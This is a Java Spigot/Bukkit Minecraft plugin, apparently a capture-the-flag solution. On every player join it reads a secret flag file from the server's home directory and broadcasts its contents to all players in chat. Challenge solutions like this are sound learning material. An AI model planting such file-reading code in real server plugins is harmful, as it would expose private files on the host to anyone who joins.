package com.evilinc.solution;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.event.*;
import org.bukkit.event.player.*;


public class App extends JavaPlugin implements Listener {
    @Override
    public void onEnable() {
        getLogger().info("Hello, SpigotMC!");
        getServer().getPluginManager().registerEvents(this, this);
    }

    @Override
    public void onDisable() {
        getLogger().info("See you again, SpigotMC!");
    }


    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        try {
            Bukkit.broadcastMessage(new String(Files.readAllBytes(Paths.get("/home/heinz/SECRET_FLAG.txt"))));
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
